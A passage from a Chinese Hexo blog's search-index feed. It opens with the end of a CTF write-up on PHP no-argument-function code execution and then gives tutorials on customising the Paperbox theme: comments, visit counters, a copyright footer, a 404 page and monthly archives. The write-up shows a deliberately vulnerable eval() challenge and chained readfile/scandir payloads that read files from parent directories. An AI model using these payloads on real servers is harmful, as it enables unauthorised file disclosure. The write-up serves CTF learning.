class="comment">//交换键值</span></span><br><span class="line"></span><br><span class="line">getallheaders(): <span class="keyword">array</span>; <span class="comment">//get http header 变量；apache专属</span></span><br><span class="line"></span><br><span class="line">get_defined_vars(): <span class="keyword">array</span>; <span class="comment">// 回显 $_GET $_POST $_FILES $_COOKIE</span></span><br><span class="line"></span><br><span class="line">session_id(); <span class="comment">//修改session_id的值然后再取出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件；</span></span><br><span class="line">dirname(); <span class="comment">//上层目录跳转</span></span><br><span class="line">chdir();</span><br><span class="line">getcwd(); <span class="comment">//=pwd命令</span></span><br><span class="line">scandir(); <span class="comment">// array(3) &#123; [0]=&gt; string(1) "." [1]=&gt; string(2) ".." [2]=&gt; string(9) "index.php" &#125;</span></span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="bytectf-2019-boring-code"><a href="#bytectf-2019-boring-code" class="headerlink" title="bytectf 2019 - boring code"></a>bytectf 2019 - boring code</h3><p>bytectf(2019)有一道题目，boring code是讲这个的，</p><p>参考链接：<a href="https://www.xmsec.cc/bytectf-2019-web-writeup/" target="_blank" rel="noopener">https://www.xmsec.cc/bytectf-2019-web-writeup/</a> 代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            var_dump($code);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这道题目具体是要通过baidu.com结尾的网站跳转到poc然后解析无参poc最后读取到ctf flag文件</p><p>读当前目录的payload <code>echo(readfile(end(scandir(&quot;.&quot;))))</code>当然需要读取的是上一层，所以是<code>next(scandir(&quot;.&quot;))</code> 拿到 <code>..</code>，然后 <code>chdir(next(scandir(&quot;.&quot;)))</code>就可以退到上一层目录了；退到上一层目录之后，要读取index.php的内容，就用读取当前目录payload嵌套一遍呀~</p><p>最后是，如何产生”.”，<code>chr(pos(localtime()))</code>，第46秒，是chr(46)=”.”</p><p>所以最后的payload</p><p><code>readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(pos(localtime()))))))))))));</code></p><p>另外一个读取上一层目录文件的payload:</p><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></p><h3 id="TetCTF-2018-PHP-limit-Revenge"><a href="#TetCTF-2018-PHP-limit-Revenge" class="headerlink" title="TetCTF 2018 - PHP limit Revenge"></a>TetCTF 2018 - PHP limit Revenge</h3><p>题目也差不多，与bytectf2019是同一个正则，所以来看看他的思路<a href="https://tuanlinh.gitbook.io/ctf/tetctf-2018" target="_blank" rel="noopener">https://tuanlinh.gitbook.io/ctf/tetctf-2018</a></p><h4 id="php-limit-revenge1"><a href="#php-limit-revenge1" class="headerlink" title="php limit revenge1"></a>php limit revenge1</h4><p><code>http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(rand()))))));</code></p><p><code>http://139.180.219.222/?code=print(readfile(end(scandir(realpath(chr(ord(join(localeconv()))))))));</code></p><h4 id="php-limit-revenge2"><a href="#php-limit-revenge2" class="headerlink" title="php limit revenge2"></a>php limit revenge2</h4><p>限制了函数貌似，而且也需要返回到上层目录</p><p><code>http://45.76.181.81/?code=print(readfile(end(scandir(chr(octdec(ord(ceil(sqrt(ord(exp(chdir(next(scandir(current(localeconv())))))))))))))));</code></p><p>是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp(1) = e^1 = 2.xxxx</span><br><span class="line">ord(2) = 50</span><br><span class="line">sqrt(50) = 7.xx </span><br><span class="line">ceil(7.x) = 8</span><br><span class="line">ord(<span class="string">'8'</span>) = 56</span><br><span class="line">oct2dec(56) = 46</span><br><span class="line">chr(46) = <span class="string">'.'</span></span><br></pre></td></tr></table></figure><p>其中 <code>chr(octdec(ord(ceil(sqrt(ord(exp()))))))</code> 返回了 <code>.</code> 这个符号，exp 的参数是 true，即 1。最内层的 <code>current(localeconv())</code> 函数返回 <code>.</code>。</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paperbox主题改造5-添加评论系统和统计</title>
      <link href="/2019/09/12/changepaperbox5/"/>
      <url>/2019/09/12/changepaperbox5/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>对我的paperbox（现在这个主题，landscape plus基础修改而来的，我引用了）做基于自己喜好的改造；</p><p>Part5: 添加评论系统和统计</p><a id="more"></a><p>这次做的事情：</p><ul><li><strong>评论系统</strong></li><li><strong>阅读统计</strong></li><li><strong>版权声明</strong></li></ul><h2 id="评论系统"><a href="#评论系统" class="headerlink" title="评论系统"></a>评论系统</h2><p>现在看到比较好的是Disqus，畅言，Valine，来必力， gitment和uttrancens</p><p>Disqus 已经被墙了…也有几种免翻墙用 Disqus 评论的解决办法，例如 disqus-proxy、DisqusJS和 Disqus PHP API，不过它们都需要另外一台服务器来进行反代理</p><p>畅言，搜狐作的评论系统，需要备案才能使用。</p><p>来必力，韩国的一个评论系统，看上去不错，而且支持多账号登录，但是好像慢哦</p><p>Valine，基于 Leancloud ，支持匿名，其实不错啦，而且<a href="https://github.com/hexojs/hexo-theme-landscape/" target="_blank" rel="noopener">hexo-theme-landscape</a>好像支持了，copy一下应该就好了</p><p>gitment，使用 Github 的 issue 系统作为评论系统，权限太高了。。。太不安全了。。。</p><p>uttrancens，同上，但是权限控制比较好，可以限制为只操作某个repo的issue</p><p>权衡之后还是想选择<strong>uttrancens</strong>，一个是不想使用valine的匿名，一个是手贱，就是想试试看git，而且git账号还是比较广泛的；方便发言、查看和管理；</p><p>官网：<a href="https://utteranc.es/" target="_blank" rel="noopener">https://utteranc.es/</a></p><p>首先来<a href="https://github.com/apps/utterances" target="_blank" rel="noopener">这里</a>为utterances在github上授权</p><p><img src="https://i.loli.net/2019/12/04/gdi3Xf2DhpSyN4K.png" alt="access control"></p><p>在<a href="https://utteranc.es/" target="_blank" rel="noopener">官网</a>上填写不同的参数，repo写上面哪个repo地址；issue-term一般选择pathname,当然也可以选择别的作为issue标题；theme表示主题；</p><p><img src="https://i.loli.net/2019/12/04/Vbwa8LFDtpC2rks.png" alt="配置选择"></p><p>添加一个ejs文件：</p><figure class="highlight plain"><figcaption><span>layout/_partial/utterances.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://utteranc.es/client.js&quot;</span><br><span class="line">    repo=&quot;&lt;%= theme.utterances.repo %&gt;&quot;</span><br><span class="line">    issue-term=&quot;&lt;%= theme.utterances.issue_term %&gt;&quot;</span><br><span class="line">    theme=&quot;&lt;%= theme.utterances.theme %&gt;&quot;</span><br><span class="line">    crossorigin=&quot;anonymous&quot;</span><br><span class="line">    async&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>配置：</p><figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">utterances:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  repo:</span> <span class="string">CapybaraJ/capybaraj.github.io</span></span><br><span class="line"><span class="attr">  issue_term:</span> <span class="string">pathname</span></span><br><span class="line"><span class="attr">  theme:</span> <span class="string">github-light</span></span><br></pre></td></tr></table></figure><p>加入到article.ejs</p><figure class="highlight plain"><figcaption><span>layout/_partial/article.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;footer class=&quot;article-footer&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;article-footer-content&quot;&gt;</span><br><span class="line">        ...</span><br><span class="line">        &lt;% if (post.comments &amp;&amp; theme.utterances.enable)&#123; %&gt;</span><br><span class="line">          &lt;a href=&quot;&lt;%- post.permalink %&gt;#utterances&quot; class=&quot;article-comment-link&quot;&gt;&lt;%= __(&apos;comments&apos;) %&gt;&lt;/a&gt;</span><br><span class="line">        &lt;% &#125; else if (post.comments &amp;&amp; config.disqus_shortname )&#123; %&gt;</span><br><span class="line">          &lt;a href=&quot;&lt;%- post.permalink %&gt;#disqus_thread&quot; class=&quot;article-comment-link&quot;&gt;&lt;%= __(&apos;comments&apos;) %&gt;&lt;/a&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">       ...</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line"></span><br><span class="line">末端：</span><br><span class="line">&lt;div class=&quot;article-inner&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;fill-content&quot;&gt;</span><br><span class="line">    &lt;% if (!index &amp;&amp; theme.utterances.enable)&#123; %&gt;</span><br><span class="line">      &lt;section id=&quot;comments&quot;&gt;</span><br><span class="line">        &lt;%- partial(&apos;utterances&apos;) %&gt;</span><br><span class="line">      &lt;/section&gt;</span><br><span class="line">    &lt;% &#125; else if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">      &lt;section id=&quot;comments&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;disqus_thread&quot;&gt;</span><br><span class="line">          &lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;//disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/section&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>最终效果图</p><p><img src="https://i.loli.net/2019/12/04/V2KYNydBvOR4CUF.png" alt="uttrances效果图"></p><p>参考: <a href="https://chriszheng.science/2015/09/13/Hexo-add-recent-comment/" target="_blank" rel="noopener">为Hexo添加最近评论支持——以Landscape类主题为例</a></p><h2 id="阅读统计"><a href="#阅读统计" class="headerlink" title="阅读统计"></a>阅读统计</h2><p>两个比较好的系统： busuanzi和leancloud</p><p>参考：</p><p><a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="noopener">不蒜子</a>，介绍比较详细</p><p><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子官网</a>，听说可以初始化访问量；不过要注册，目前注册未开放</p><p>网上比较多的资料是关于next主题下的添加，这个很好搜，例如<a href="[https://hexo-guide.readthedocs.io/zh_CN/latest/third-service/[LeanCloud]%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0.html](https://hexo-guide.readthedocs.io/zh_CN/latest/third-service/[LeanCloud]文章阅读次数.html)">hexo-guide</a></p><p>使用Leancloud：<a href="http://www.icafebolger.com/hexo/hexopostcount.html" target="_blank" rel="noopener">统计学统计阅读次数</a></p><p>这里用的是不蒜子，其实按照说明很简单，一个是引入js,一个是引入位置</p><p>在主题_config.yml文件加一个参数</p><figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">footer:</span></span><br><span class="line"><span class="attr">counter:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在语言文件里添加全局，其余的语言文件同理</p><figure class="highlight yml"><figcaption><span>languages/default.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">views:</span> <span class="string">Views</span></span><br><span class="line"><span class="attr">visitors:</span> <span class="string">Visitors</span></span><br></pre></td></tr></table></figure><p>然后修改footer.ejs:</p><figure class="highlight plain"><figcaption><span>layout/_partial/footer.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;footer id=&quot;footer&quot;&gt;</span><br><span class="line">  &lt;% if (theme.sidebar === &apos;bottom&apos;)&#123; %&gt;</span><br><span class="line">    &lt;%- partial(&apos;_partial/sidebar&apos;) %&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br><span class="line">  &lt;div class=&quot;outer&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;footer-info&quot; class=&quot;inner&quot;&gt;</span><br><span class="line">      &amp;copy; &lt;%= date(new Date(), &apos;YYYY&apos;) %&gt; &lt;%= config.author || config.title %&gt;&amp;nbsp;</span><br><span class="line">      &lt;% if (theme.footer.counter) &#123;%&gt;</span><br><span class="line">        &lt;script async src=&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">        &lt;span id=&quot;busuanzi_container_site_pv&quot;&gt;&lt;%= __(&apos;views&apos;) %&gt;&amp;nbsp;&lt;span id=&quot;busuanzi_value_site_pv&quot;&gt;&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">        &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">        &lt;span id=&quot;busuanzi_container_site_uv&quot;&gt;&lt;%= __(&apos;visitors&apos;) %&gt;&amp;nbsp;&lt;span id=&quot;busuanzi_value_site_uv&quot;&gt;&lt;/span&gt;&lt;/span&gt;</span><br><span class="line">        &lt;!-- &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt; --&gt;</span><br><span class="line">      &lt;% &#125; %&gt;</span><br><span class="line">      &lt;br&gt;</span><br><span class="line">      Powered by &lt;a href=&quot;http://hexo.io/&quot; target=&quot;_blank&quot;&gt;Hexo&lt;/a&gt;</span><br><span class="line">      .</span><br><span class="line">      Theme by &lt;a href=&quot;https://github.com/sun11/hexo-theme-paperbox&quot; target=&quot;_blank&quot;&gt;Paperbox&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/footer&gt;</span><br></pre></td></tr></table></figure><p>看下效果：</p><img src="https://i.loli.net/2019/12/04/gINEs6QBVi3ozKm.png" alt="页脚添加访问量统计" style="zoom:50%"><p>如果要增加单页面量访问（index页面还是不访问了）</p><figure class="highlight plain"><figcaption><span>layout/_partial/article.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;footer class=&quot;article-footer&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;article-footer-content&quot;&gt;</span><br><span class="line">        ...省略</span><br><span class="line">        &lt;% if(!index &amp;&amp; theme.footer.counter)&#123; %&gt;</span><br><span class="line">            &lt;span id=&quot;busuanzi_container_page_pv&quot;&gt;</span><br><span class="line">              &lt;span id=&quot;busuanzi_value_page_pv&quot; class=&quot;article-count-link&quot;&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/span&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">        </span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br></pre></td></tr></table></figure><p>说一下styl:article-count-link</p><figure class="highlight stylus"><figcaption><span>source/css/_partial/article.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.article-count-link</span><br><span class="line">  <span class="attribute">float</span>: right</span><br><span class="line">  &amp;:before</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">"\f06e"</span> //一只眼睛</span><br><span class="line">    <span class="attribute">font-family</span>: font-icon</span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">8px</span></span><br></pre></td></tr></table></figure><p>看下效果</p><img src="https://i.loli.net/2019/12/04/KcpFlnZR2H4oSJi.png" alt="单文章阅读量" style="zoom:50%"><h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>新建一个statment.ejs</p><figure class="highlight plain"><figcaption><span>layout/_partial/post/statement.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; page.source != &apos;about/index.md&apos;)&#123; %&gt;</span><br><span class="line">    &lt;div class=&quot;article-statement&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    本文作者: &amp;nbsp;&lt;%= config.author %&gt;&lt;br&gt;</span><br><span class="line">    本文链接: &amp;nbsp;&lt;a herf=&quot;#&quot;&gt;&lt;%= page.permalink %&gt;&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    版权声明: &amp;nbsp;除非注明，本博文章均为原创，转载请以链接形式标明本文地址&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><figcaption><span>source/css/_partial/article.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.article-statement</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">1em</span></span><br><span class="line">  <span class="attribute">font-weight</span>: bold</span><br><span class="line">  <span class="attribute">font-family</span>: cursive</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#888</span>;</span><br></pre></td></tr></table></figure><p>最后在文章<code>&lt;%- post.content %&gt;</code>后面添加</p><figure class="highlight plain"><figcaption><span>layout/_partial/article.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&apos;post/statement&apos;) %&gt;</span><br></pre></td></tr></table></figure><p>效果，我觉得还不错~：</p><p><img src="https://i.loli.net/2019/12/04/fdyL1OMYQIZNjrC.png" alt="版权声明"></p><p>参考：</p><p><a href="https://jerry011235.github.io/2015/11/15/Hexo文章末尾添加版权或自定义文本/" target="_blank" rel="noopener">Hexo文章末尾添加版权或自定义文本</a></p><p><a href="[https://arcecho.github.io/2017/04/08/Hexo-Next%E4%B8%8B%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E6%A8%A1%E5%9D%97/](https://arcecho.github.io/2017/04/08/Hexo-Next下添加版权声明模块/)">Hexo-Next下添加版权声明模块</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paperbox主题改造4-404与按月归档</title>
      <link href="/2019/09/10/changepaperbox4/"/>
      <url>/2019/09/10/changepaperbox4/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>对我的paperbox（现在这个主题，landscape plus基础修改而来的，我引用了）做基于自己喜好的改造；</p><p>Part4: 404与按月归档</p><a id="more"></a><p>没想到这么快就更新了23333</p><p>这次想做的事情增加到：</p><ul><li><p><strong>一个是404页面的添加</strong></p></li><li><p><strong>一个是按月归档</strong></p></li><li><p>评论系统</p></li><li><p>阅读统计</p></li><li><p>如果有机会，我想更换一个好看点的about me…</p></li></ul><h2 id="404"><a href="#404" class="headerlink" title="404"></a>404</h2><p>腾讯公益404考虑下</p><figure class="highlight html"><figcaption><span>source/404.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Oops<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"font-size:14px;"</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">title</span>&gt;</span>公益404<span class="tag">&lt;/<span class="name">title</span>&gt;</span>                                                                                                                                        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">homePageUrl</span>=<span class="string">"https://fatheadrat.tk/"</span> <span class="attr">homePageName</span>=<span class="string">"回到我的主页"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="按月归档"><a href="#按月归档" class="headerlink" title="按月归档"></a>按月归档</h2><p>以前是按年归档的，比如</p><p><img src="https://i.loli.net/2019/10/04/YNXVOI4HilcL2Ze.png" alt="image-20191004114917485"></p><p>现在：</p><p><img src="https://i.loli.net/2019/10/04/ApNMH5zsClfOuqG.png" alt="image-20191004115000331"></p><p>代码，修改成这个，从else开始；解释一下，其实就是正常的逻辑判断，加了个month</p><figure class="highlight plain"><figcaption><span>layout/_partial/archive.ejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;% &#125; else &#123; %&gt;</span><br><span class="line">  &lt;% var last; var lastmonth;%&gt;</span><br><span class="line">  &lt;% page.posts.each(function(post, i)&#123; %&gt;</span><br><span class="line">    &lt;% var year = post.date.year(); %&gt;</span><br><span class="line">    &lt;!--这个month 取值 0-11，而且1 要表示成 01,所以要加0--&gt;</span><br><span class="line">    &lt;% var month = post.date.month()+1; month = (&quot;0&quot; + month).substr(-2)%&gt;</span><br><span class="line">    &lt;% if (last != year || lastmonth != month)&#123; %&gt;</span><br><span class="line">      &lt;% if (last != null &amp;&amp; last != lastmonth)&#123; %&gt;</span><br><span class="line">        &lt;/div&gt;&lt;/section&gt;</span><br><span class="line">      &lt;% &#125; %&gt;</span><br><span class="line">      &lt;% last = year; %&gt;</span><br><span class="line">      &lt;% lastmonth = month; %&gt;</span><br><span class="line">      &lt;section class=&quot;archives-wrap&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;archive-year-wrap&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;&lt;%- url_for(&apos;archives/&apos; + year + &apos;/&apos; + month ) %&gt;&quot; class=&quot;archive-year&quot;&gt;&lt;%= year %&gt;&amp;nbsp;-&amp;nbsp;&lt;%= month %&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;archives&quot;&gt;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paperbox主题改造3-字体美化与搜索框的添加</title>
      <link href="/2019/09/08/changepaperbox3/"/>
      <url>/2019/09/08/changepaperbox3/</url>
      
